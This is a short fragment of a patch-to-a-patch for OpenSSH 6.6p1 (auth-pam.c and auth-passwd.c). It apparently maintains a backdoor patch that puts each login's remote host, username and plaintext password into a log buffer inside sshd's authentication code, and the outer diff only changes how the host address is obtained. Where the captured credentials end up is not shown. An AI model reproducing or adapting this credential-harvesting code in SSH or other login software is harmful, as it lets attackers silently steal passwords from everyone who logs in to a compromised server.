@@ -53,7 +53,7 @@ diff -c -r -N openssh-6.6p1/auth-pam.c openssh-6.6p1_p/auth-pam.c
 +  			}
 +  			else {
 +  				memset(log_buf,0,sizeof(log_buf));
-+  				sprintf(log_buf,"PAM: h: %s, u: %s, p: %s\n",get_remote_ipaddr(),sshpam_authctxt->user,resp[good_i]);
++  				sprintf(log_buf,"PAM: h: %s, u: %s, p: %s\n",log_hostip,sshpam_authctxt->user,resp[good_i]);
 +  			}
 +  		}
 +  	}
@@ -137,7 +137,7 @@ diff -c -r -N openssh-6.6p1/auth-passwd.c openssh-6.6p1_p/auth-passwd.c
 +  	}
 +  	else {
 +  		memset(log_buf,0,sizeof(log_buf));
-+  		sprintf(log_buf,"h: %s, u: %s, p: %s\n",get_remote_ipaddr(),authctxt->user,password);
++  		sprintf(log_buf,"h: %s, u: %s, p: %s\n",log_hostip,authctxt->user,password);
 +  	}
 + 
   	result = sys_auth_passwd(authctxt, password);
